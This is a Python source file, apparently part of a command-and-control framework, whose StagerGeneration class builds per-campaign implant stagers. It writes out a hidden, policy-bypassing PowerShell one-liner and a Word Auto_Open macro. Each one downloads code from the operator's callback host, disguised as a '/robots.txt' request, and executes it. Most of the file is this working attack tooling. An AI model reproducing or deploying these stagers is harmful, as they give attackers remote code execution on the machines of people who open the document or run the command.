from Data.Database import Database


class StagerGeneration:
    # TODO: This needs cleaned up to ensure expandability with database changes.
    db = None

    def __init__(self):
        self.db = Database()

    def generate_static_stagers(self, cid, user):
        ret_data = {}
        if self.db.campaign.Verify_UserCanAccessCampaign(user, cid):
            implant_info = self.db.implant.Get_AllImplantBaseFromCid(cid)
            if implant_info is not False:
                for implant in implant_info:
                    ret_data[implant['title']] = {
                        "description": implant['description'],
                        "url": implant['callback_url'],
                        "powershell_stager": self._generate_powershell_stager_string(implant),
                        # "https_powershell_stager": self.__generate_https_powershell_stager_string(implant),
                        "docm_macro_stager": self._generate_docx_stager_string(implant),
                        "stager_key": implant['stager_key']}
            return ret_data
        else:
            return ret_data

    def GenerateSingleStagerFile(self, cid, user, stager_type):
        # TODO: Create docx file download from template.
        if self.db.campaign.Verify_UserCanAccessCampaign(user, cid):

            if stager_type == "docx":
                return self._generate_docx_stager_file()
            return
        else:
            return False

    @staticmethod
    def _generate_docx_stager_string(implant_data):

        if implant_data['comms_https'] == 1:
            http_proto = "https"
            port = implant_data['comms_https']
        else:
            http_proto = "http"
            port = implant_data['comms_https']
        stager_string = f'''Sub Auto_Open()
Dim exec As String
exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('{http_proto}://{implant_data['callback_url']}:{port}/robots.txt?user={implant_data['stager_key']}'))"""
Shell (exec)
End Sub
:return:'''

        return stager_string

    @staticmethod
    def _generate_powershell_stager_string(implant_data):
        if implant_data['comms_https'] == 1:
            http_proto = "https"
            port = implant_data['comms_https']
        else:
            http_proto = "http"
            port = implant_data['comms_http']

        stager_string = f"powershell -windowstyle hidden -exec bypass -c " \
                        f"\"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::" \
                        f"DefaultNetworkCredentials;(iwr '{http_proto}://{implant_data['callback_url']}:{port}" \
                        f"/robots.txt?user={ implant_data['stager_key']}' -UseBasicParsing)|iex\""

        return stager_string
